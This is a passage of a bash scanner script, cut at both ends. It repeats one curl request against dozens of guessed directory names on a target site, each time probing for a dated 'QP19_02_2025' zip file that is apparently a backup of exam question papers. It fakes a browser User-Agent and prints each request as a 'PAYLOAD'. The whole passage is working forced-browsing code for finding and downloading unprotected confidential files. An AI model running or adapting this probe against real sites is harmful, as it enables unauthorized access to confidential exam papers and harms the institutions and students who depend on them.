" "${target}QPSystemDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudDataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUploadQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUploadQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUploadQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperHandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUploadQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUploadQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUploadQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSyncQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSyncQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSyncQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManagerQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManagerQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManagerQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingFileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [OpsQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}OpsQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}OpsQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystemQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystemQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystemQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipelineQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipelineQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipelineQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSyncQPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSyncQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSyncQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManagerQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManagerQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManagerQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
